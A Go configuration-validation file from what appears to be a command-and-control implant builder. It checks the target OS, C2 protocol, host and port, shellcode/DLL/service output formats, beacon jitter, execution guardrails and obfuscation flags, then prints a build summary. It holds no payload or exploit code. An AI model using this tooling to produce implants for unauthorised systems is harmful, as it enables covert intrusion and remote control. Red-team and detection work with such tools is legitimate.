//config/validate.go
package config

import (
        "errors"
        "fmt"
        "path/filepath"
        "regexp"
        "strconv"
        "strings"
        "time"
)

// Validate — config ke sare fields check karo
func (cfg *PayloadConfig) Validate() error {

        validOS := map[string]bool{"windows": true, "linux": true, "darwin": true}
        if !validOS[strings.ToLower(cfg.OS)] {
                return errors.New("invalid OS: must be windows / linux / darwin")
        }

        validArch := map[string]bool{"amd64": true, "arm64": true, "386": true}
        if !validArch[strings.ToLower(cfg.Arch)] {
                return errors.New("invalid arch: must be amd64 / arm64 / 386")
        }

        validProto := map[string]bool{"mtls": true, "http": true, "https": true, "dns": true}
        if !validProto[strings.ToLower(cfg.Protocol)] {
                return errors.New("invalid protocol: must be mtls / http / https / dns")
        }

        if cfg.C2Host == "" {
                return errors.New("C2 host cannot be empty")
        }
        // B-M5: tightened C2Host validation — accepts only a well-formed IPv4
        // (4 dotted octets, 0-255 each) or an RFC-1123 hostname (labels of
        // 1-63 chars, no leading/trailing hyphens, total length <= 253).
        // The previous `^[a-zA-Z0-9.\-]+$` regex allowed garbage like
        // `---...---` or `1.2.3.4.5` (5 octets).
        if !isValidIPv4(cfg.C2Host) && !isValidHostname(cfg.C2Host) {
                return fmt.Errorf("invalid C2 host: %s (must be IPv4 or RFC-1123 hostname)", cfg.C2Host)
        }

        if cfg.C2Port < 1 || cfg.C2Port > 65535 {
                return fmt.Errorf("invalid port: %d (must be 1-65535)", cfg.C2Port)
        }

        validFormat := map[string]bool{"exe": true, "shellcode": true, "dll": true, "service": true}
        if !validFormat[strings.ToLower(cfg.Format)] {
                return errors.New("invalid format: must be exe / shellcode / dll / service")
        }

        if cfg.Arch == "386" && cfg.Format == "shellcode" && cfg.OS != "windows" {
                return errors.New("shellcode format with 386 arch is only supported on windows")
        }

        if (cfg.Protocol == "http" || cfg.Protocol == "https") && cfg.UserAgent == "" {
                return errors.New("user-agent cannot be empty for http/https protocols")
        }

        if cfg.IsBeacon {
                if cfg.BeaconInterval < 1 {
                        return errors.New("beacon interval must be at least 1 second")
                }
                if cfg.BeaconJitter < 0 {
                        return errors.New("beacon jitter cannot be negative")
                }
                if cfg.BeaconJitter >= cfg.BeaconInterval {
                        return errors.New("beacon jitter must be less than beacon interval")
                }
        }

        if cfg.ReconnectInterval < 1 {
                return errors.New("reconnect interval must be at least 1 second")
        }

        if cfg.MaxConnectionErrors < 1 {
                return errors.New("max connection errors must be at least 1")
        }

        if cfg.LimitDatetime != "" {
                matched, _ := regexp.MatchString(`^\d{4}-\d{2}-\d{2}$`, cfg.LimitDatetime)
                if !matched {
                        return errors.New("limit datetime must be in YYYY-MM-DD format")
                }
                _, err := time.Parse("2006-01-02", cfg.LimitDatetime)
                if err != nil {
                        return fmt.Errorf("invalid limit datetime: %v", err)
                }
        }

        if cfg.PayloadName != "" {
                cfg.PayloadName = strings.TrimSuffix(cfg.PayloadName, filepath.Ext(cfg.PayloadName))
                valid := regexp.MustCompile(`^[a-zA-Z0-9_\-]+$`)
                if !valid.MatchString(cfg.PayloadName) {
                        return errors.New("payload name: only letters, numbers, - and _ allowed")
                }
        }

        return nil
}

// Summary — user ko dikhao kya build hoga
func (cfg *PayloadConfig) Summary() string {
        mode := "Session (interactive)"
        if cfg.IsBeacon {
                mode = fmt.Sprintf("Beacon (interval: %ds, jitter: %ds)",
                        cfg.BeaconInterval, cfg.BeaconJitter)
        }

        limits := "none"
        var limitParts []string
        if cfg.LimitHostname != "" {
                limitParts = append(limitParts, "hostname="+cfg.LimitHostname)
        }
        if cfg.LimitUsername != "" {
                limitParts = append(limitParts, "username="+cfg.LimitUsername)
        }
        if cfg.LimitDatetime != "" {
                limitParts = append(limitParts, "expires="+cfg.LimitDatetime)
        }
        if cfg.LimitDomainJoined {
                limitParts = append(limitParts, "domain-joined=true")
        }
        if len(limitParts) > 0 {
                limits = strings.Join(limitParts, ", ")
        }

        name := cfg.PayloadName
        if name == "" {
                name = "(random)"
        }

        encStatus := "Auto (random 32-byte key)"
        if cfg.EncryptionKey != "" {
                encStatus = "Custom PSK"
        }

        return fmt.Sprintf(`
┌─────────────────────────────────────────────────┐
│               BUILD SUMMARY                     │
├─────────────────────────────────────────────────┤
│ Target   : %s / %s
│ Protocol : %s → %s:%s
│ Format   : %s
│ Mode     : %s
│ Obfuscate: %s (Debug: %s)
│ Encrypt  : %s
│ Limits   : %s
│ Name     : %s
│ Output   : %s
└─────────────────────────────────────────────────┘`,
                cfg.OS, cfg.Arch,
                cfg.Protocol, cfg.C2Host, strconv.Itoa(cfg.C2Port),
                cfg.Format,
                mode,
                boolStr(cfg.ObfuscateSymbols), boolStr(cfg.Debug),
                encStatus,
                limits,
                name,
                cfg.OutputDir,
        )
}

func boolStr(b bool) string {
        if b {
                return "yes"
        }
        return "no"
}

// ============================================================
// B-M5: C2Host validation helpers
// ============================================================

// ipv4OctetRE matches a single decimal octet value (1-3 digits).
var ipv4OctetRE = regexp.MustCompile(`^(0|[1-9][0-9]?|1[0-9][0-9]|2[0-4][0-9]|25[0-5])$`)

// hostnameLabelRE matches a single RFC-1123 label:
//   - 1-63 chars total
//   - alphanumerics and hyphens only
//   - must NOT start or end with a hyphen
var hostnameLabelRE = regexp.MustCompile(`^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?$`)

// isValidIPv4 returns true only for a well-formed dotted-quad IPv4 address
// where every octet is in the range 0-255 (no leading zeros except "0" itself).
func isValidIPv4(s string) bool {
        if s == "" {
                return false
        }
        parts := strings.Split(s, ".")
        if len(parts) != 4 {
                return false
        }
        for _, p := range parts {
                if !ipv4OctetRE.MatchString(p) {
                        return false
                }
        }
        return true
}

// isValidHostname returns true only for an RFC-1123 hostname:
//   - 1-253 chars total
//   - dotted labels, each 1-63 chars
//   - alphanumerics and hyphens only
//   - labels cannot start or end with a hyphen
func isValidHostname(s string) bool {
        if s == "" || len(s) > 253 {
                return false
        }
        // Trailing dot is legal for FQDNs — strip it before label validation.
        s = strings.TrimSuffix(s, ".")
        if s == "" {
                return false
        }
        for _, label := range strings.Split(s, ".") {
                if !hostnameLabelRE.MatchString(label) {
                        return false
                }
        }
        return true
}